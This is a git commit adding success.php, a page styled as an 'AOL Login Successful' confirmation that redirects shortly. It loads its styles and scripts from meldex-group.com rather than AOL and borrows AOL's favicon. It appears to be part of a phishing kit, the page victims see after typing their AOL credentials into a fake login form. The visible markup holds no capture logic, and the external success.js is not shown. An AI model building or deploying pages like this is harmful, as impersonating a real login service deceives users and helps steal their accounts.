6e2130c657036df983d68ec153882df55a4541f2
wdams <94839483+wdams@users.noreply.github.com>
2021-11-22 19:55:32 +0200

    Add files via upload

---
+++ success.php
@@ -0,0 +1,55 @@
+
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link href="https://meldex-group.com/oal/aol/Successful_files/css" rel="stylesheet">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>AOL Login Successful</title>
+    <meta name="" content="">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://www.google.com/s2/favicons?domain=aol.com" id="favimg">  <style>
+      body {
+        text-align: center;
+        padding: 40px 0;
+        background: #EBF0F5;
+      }
+        h1 {
+          color: #88B04B;
+          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
+          font-weight: 900;
+          font-size: 40px;
+          margin-bottom: 10px;
+        }
+        p {
+          color: #404F5E;
+          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
+          font-size:20px;
+          margin: 0;
+        }
+      i {
+        color: #9ABC66;
+        font-size: 100px;
+        line-height: 200px;
+        margin-left:-15px;
+      }
+      .card {
+        background: white;
+        padding: 60px;
+        border-radius: 4px;
+        box-shadow: 0 2px 3px #C8D0D8;
+        display: inline-block;
+        margin: 0 auto;
+      }
+    </style></head>
+    
+    <body>
+      <div class="card">
+      <div style="border-radius:200px; height:200px; width:200px; background: #F8FAF5; margin:0 auto;">
+        <i class="checkmark">✓</i>
+      </div>
+        <h1>Login Successful!</h1> 
+        <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Redirecting Shortly.......</p>
+      </div>
+      <script src="https://meldex-group.com/oal/aol/Successful_files/jquery.min.js.download"></script>
+      <script src="https://meldex-group.com/oal/aol/Successful_files/success.js.download"></script>
+    
+</body></html>
